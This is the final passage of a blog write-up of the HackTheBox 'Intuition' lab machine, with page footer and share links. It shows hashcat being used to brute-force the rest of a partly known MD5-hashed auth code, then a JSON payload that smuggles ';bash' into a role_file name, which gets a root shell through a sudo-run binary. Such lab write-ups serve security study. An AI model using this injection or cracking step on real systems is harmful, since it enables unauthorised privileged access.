</span></span><span class="line"><span class="cl"><span class="c1"># ./runner run [playbook number] -a [auth code]</span>
</span></span><span class="line"><span class="cl"><span class="c1">#./runner1 run 1 -a &#34;UHI75GHI****&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Install roles [Need authentication]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ./runner install [role url] -a [auth code]</span>
</span></span><span class="line"><span class="cl"><span class="c1">#./runner1 install http://role.host.tld/role.tar -a &#34;UHI75GHI****&#34;</span>
</span></span></code></pre></div><p>The &ldquo;runner1.c&rdquo; file contains the authentication code, but it&rsquo;s hashed in MD5. I will save it somewhere naming <code>myhash.txt</code>.</p>
<p>I cracked the auth code from run-tests.sh file using the following command as we knew the first part of the authentication key **<code>UHI75GHI****</code>**and the hash was available in runner1.c:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="nt">hashcat</span><span class="p">.</span><span class="nc">exe</span> <span class="nt">-a3</span> <span class="nt">-m0</span> <span class="nt">myhash</span><span class="p">.</span><span class="nc">txt</span> <span class="nt">UHI75GHI</span><span class="o">?</span><span class="nt">u</span><span class="o">?</span><span class="nt">u</span><span class="o">?</span><span class="nt">u</span><span class="o">?</span><span class="nt">u</span> <span class="nt">--self-test-disable</span>
</span></span></code></pre></div><p>The cracked hash is <strong><code>UHI75GHINKOP</code></strong>.</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/intuition/Untitled%2011.png"></p>
<p>I created a file named &ldquo;exploit.json&rdquo; containing:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;run&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;action&#34;</span><span class="p">:</span><span class="s2">&#34;install&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;role_file&#34;</span><span class="p">:</span><span class="s2">&#34;file.tar&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;auth_code&#34;</span><span class="p">:</span><span class="s2">&#34;UHI75GHINKOP&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>We know the injection point is <strong><code>role_file</code></strong>. We need to perform command injection from <strong><code>role_file</code></strong> now. I renamed my file from <strong><code>file.tar</code></strong> to <strong><code>file.tar;bash</code></strong>. Now, I will adjust the payload in <strong><code>exploit.json</code></strong> accordingly.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;run&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;action&#34;</span><span class="p">:</span><span class="s2">&#34;install&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;role_file&#34;</span><span class="p">:</span><span class="s2">&#34;file.tar;bash&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;auth_code&#34;</span><span class="p">:</span><span class="s2">&#34;UHI75GHINKOP&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>I ran <strong><code>sudo /opt/runner2/runner2 exploit.json</code></strong> again.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">root@intuition:/home/lopez#</span> <span class="err">cd</span> <span class="err">~</span>
</span></span><span class="line"><span class="cl"><span class="err">root@intuition:~#</span> <span class="err">cat</span> <span class="err">root.txt</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">ROOT_FLAG_R</span><span class="mi">3</span><span class="err">DACT</span><span class="mi">3</span><span class="err">D</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">root@intuition:~#</span> <span class="err">id</span>
</span></span><span class="line"><span class="cl"><span class="err">uid=</span><span class="mi">0</span><span class="err">(root)</span> <span class="err">gid=</span><span class="mi">0</span><span class="err">(root)</span> <span class="err">groups=</span><span class="mi">0</span><span class="err">(root)</span>
</span></span></code></pre></div><p>Boom! We now have root access. üéâüöÄ</p>
<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>Thanks for following along with my walkthrough! Using various tools and techniques, we successfully identified vulnerabilities, exploited them, and gained root access. Keep exploring and happy hacking!</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/hackthebox/">HackTheBox</a></li>
      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
      <li><a href="http://localhost:1313/tags/hard/">Hard</a></li>
    </ul>


<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Intuition Writeup - HackTheBox on x"
            href="https://x.com/intent/tweet/?text=Intuition%20Writeup%20-%20HackTheBox&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhackthebox%2fintuition%2f&amp;hashtags=HackTheBox%2cLinux%2cHard">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Intuition Writeup - HackTheBox on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhackthebox%2fintuition%2f&amp;title=Intuition%20Writeup%20-%20HackTheBox&amp;summary=Intuition%20Writeup%20-%20HackTheBox&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhackthebox%2fintuition%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Intuition Writeup - HackTheBox on reddit"
            href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhackthebox%2fintuition%2f&title=Intuition%20Writeup%20-%20HackTheBox">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Intuition Writeup - HackTheBox on facebook"
            href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhackthebox%2fintuition%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Intuition Writeup - HackTheBox on whatsapp"
            href="https://api.whatsapp.com/send?text=Intuition%20Writeup%20-%20HackTheBox%20-%20http%3a%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhackthebox%2fintuition%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Intuition Writeup - HackTheBox on telegram"
            href="https://telegram.me/share/url?text=Intuition%20Writeup%20-%20HackTheBox&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhackthebox%2fintuition%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Intuition Writeup - HackTheBox on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=Intuition%20Writeup%20-%20HackTheBox&u=http%3a%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhackthebox%2fintuition%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">Rezy Dev</a></span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
